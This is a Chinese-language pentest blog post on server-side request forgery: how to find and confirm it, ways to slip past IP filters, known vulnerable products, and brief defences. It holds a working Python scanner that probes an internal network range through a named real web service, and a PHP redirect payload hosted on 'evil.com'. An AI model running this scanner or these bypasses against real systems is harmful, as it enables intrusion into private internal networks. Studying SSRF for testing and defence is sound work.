---
draft: false
date: 2016-06-30 15:30:54
title: SSRF
description: 
categories:
  - Pentest
tags:
  - ssrf
---

### 0x00 什么是SSRF
SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，<font color="FF0000">它将一个可以发起网络请求的服务当作跳板来攻击其他服务</font>，SSRF的攻击目标一般是<font color="FF0000">内网</font>。  
当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。

### 0x01 SSRF的危害
可以扫描内部网络  
可以构造数据攻击内部主机

### 0x02 漏洞挖掘
其实只要能对外发起网络请求就有可能存在SSRF漏洞。
```
1. 从WEB功能上寻找
    通过URL分享内容
    文件处理、编码处理、转码等服务
    在线翻译
    通过URL地址加载与下载图片
    图片、文章的收藏
    设置邮件接收服务器
2. 从URL关键字寻找
    share、wap、url、link、src、source、target、u、3g、
    display、sourceURl、imageURL、domain...
```

### 0x03 漏洞验证
```
http://www.aa.com/ss.php?image=http://www.baidu.com/img/bd_logo1.png
1. 右键在新窗口打开图片，图片地址为http://www.baidu.com/img/bd_logo1.png，
    说明不存在SSRF漏洞。  
2. firebug看网络连接信息，若没有http://www.baidu.com/img/bd_logo1.png
    这个图片请求，则证明图片是aa.com服务端发起的请求，则可能存在SSRF漏洞。
```

### 0x04 绕过过滤
有时漏洞利用时会遇到IP限制，可用如下方法绕过：
```
* 使用@：http://A.com@10.10.10.10 = 10.10.10.10
* IP地址转换成十进制、八进制：127.0.0.1 = 2130706433
* 使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx
* 端口绕过：ip后面加一个端口
* xip.io：10.0.0.1.xip.io = 10.0.0.1
        www.10.0.0.1.xip.io = 10.0.0.1
        mysite.10.0.0.1.xip.io = 10.0.0.1
        foo.bar.10.0.0.1.xip.io = 10.0.0.1
* 通过js跳转
```

### 0x05 通用的SSRF实例
* weblogin配置不当，天生ssrf漏洞
* discuz x2.5/x3.0/x3.1/x3.2 ssrf漏洞
* CVE-2016-1897/CVE-2016-1898 - FFMpeg
* CVE-2016-3718 - ImageMagick

### 0x06 附实例POC
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import re
import requests
from IPy import IP
import Queue
import threading


def get_url_queue():
    url = "http://www.sogou.com/reventondc/external?key=&objid=&type=2&charset=utf-8&url=http://"
    urllist = Queue.Queue()
    ip_list = IP('10.146.20.0/24')
    port_list = ['80','8000','8080']
    for ip_add in ip_list:
        ip_add = str(ip_add)
        for port in port_list:
            url_t = url + ip_add + ':' + port
            urllist.put(url_t)
    return urllist

def get_title(urllist):
    while not urllist.empty():
        url = urllist.get()
        html = requests.get(url).text
        patt = r'<title>(.*?)</title>'
        m = re.search(patt,html)
        if m:
            title = m.group(1)
            print "%s\t%s" % (url,title)


urllist = get_url_queue()
print "start get title..."
for x in xrange(1,30):
    t = threading.Thread(target=get_title,args=(urllist,))
    t.start()
```

### 0x07 防御
* 限制协议为http或https
* 禁止30x转跳
* 过滤参数(只要出现内网ip或域名就直接干掉)


#### ===== 20170609更新 =====
ssrf无回显用dnslog，有回显就加载第三方内容，宝哥说的姿势：

* 302跳转

```php
//在自己服务器上建立文件，利用302跳转到对方内网地址。
//http://target.com/httpProxyAccess.htm?go=http://evil.com/a.php?url=http://10.11.213.57
//a.php内容如下：
<?php
    $url = $_GET['url'];
    header("Location:".$url);
?>
```

* iframe

```php
//在自己服务器建立文件，利用iframe标签请求对方内网地址。
//参考http://www.secpulse.com/archives/50034.html
<iframe src="对方内网地址">
```
